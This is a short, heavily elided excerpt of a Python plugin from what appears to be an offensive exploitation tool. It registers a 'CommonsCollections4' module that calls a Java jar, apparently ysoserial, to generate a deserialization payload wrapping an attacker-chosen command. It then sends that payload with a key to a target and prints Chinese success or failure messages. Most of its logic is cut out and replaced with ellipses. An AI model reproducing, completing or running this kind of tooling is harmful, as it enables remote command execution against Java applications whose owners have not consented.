...
@Idea.plugin_register('Class5:CommonsCollections4')
class CommonsCollections4(object):
    ...
    def generator(self, String, fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections4', command],       #popen
        ...
        try:
            ...
            if(r.status_code==200):
                print("[+]   CommonsCollections4模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
            else:
                print("[-]   CommonsCollections4模块   key: {} 发送异常！\n[-]   状态码:{}".format(str(key),str(r.status_code)))
